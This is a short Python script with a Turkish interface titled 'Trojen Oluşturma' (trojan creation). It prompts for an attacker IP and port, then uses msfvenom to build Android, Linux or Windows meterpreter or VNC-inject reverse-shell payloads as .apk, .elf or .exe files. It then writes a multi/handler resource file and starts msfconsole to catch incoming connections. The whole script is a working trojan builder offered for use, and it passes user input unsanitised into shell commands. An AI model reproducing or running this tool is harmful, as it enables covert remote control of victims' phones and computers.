#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import os
import time

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet TROJEN OLUSTURMA")

print("""
---------------------------------------------------------------------------------------------
-------------------------Trojen Oluşturma Programına Hoşgeldiniz.----------------------------
---------------------------------------------------------------------------------------------
-------------------------------------Ferhat Sara---------------------------------------------
---------------------------------------------------------------------------------------------



""")

ip=raw_input("İp Adresi Girin:  ")
port=raw_input("Port Numarası Girin:  ")

print("""
---------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------
-------------------------------1)android/meterpreter_reverse_tcp-----------------------------
-------------------------------2)linux/x86/meterpreter_reverse_tcp---------------------------
-------------------------------3)windows/meterpreter/reverse_tcp-----------------------------
-------------------------------4)windows/vncinject/reverse_tcp-------------------------------
---------------------------------------------------------------------------------------------
-------------------------------------Ferhat Sara---------------------------------------------
---------------------------------------------------------------------------------------------


""")

choice=raw_input("İşlem Numarası Girin:  ")	
storage=raw_input("Kayıt Yeri Giriniz: (example: /root/Desktop)  ")
filename=raw_input("Dosya İsmi Giriniz:  ")

if(choice=="1"):
	os.system("msfvenom -p android/meterpreter_reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw -o "+storage+"/"+filename+".apk")
	os.system("touch info.txt")
	os.system("echo 'use multi/handler\nset payload android/meterpreter_reverse_tcp\nset LHOST {}\nset LPORT {}\nexploit' > info.txt".format(ip,port))
	os.system("msfconsole -r info.txt")
if(choice=="2"):
	os.system("msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf -o "+storage+"/"+filename+".elf")
	os.system("touch info.txt")
	os.system("echo 'use multi/handler\nset payload linux/x86/meterpreter_reverse_tcp\nset LHOST {}\nset LPORT {}\nexploit' > info.txt".format(ip,port))
	os.system("msfconsole -r info.txt")
if(choice=="3"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe -o "+storage+"/"+filename+".exe")
	os.system("touch info.txt")
	os.system("echo 'use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST {}\nset LPORT {}\nexploit' > info.txt".format(ip,port))
	os.system("msfconsole -r info.txt")
if(choice=="4"):
	os.system("msfvenom -p windows/vncinject/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe -o "+storage+"/"+filename+".exe")
	os.system("touch info.txt")
	os.system("echo 'use multi/handler\nset payload windows/vncinject/reverse_tcp\nset LHOST {}\nset LPORT {}\nexploit' > info.txt".format(ip,port))
	os.system("msfconsole -r info.txt")














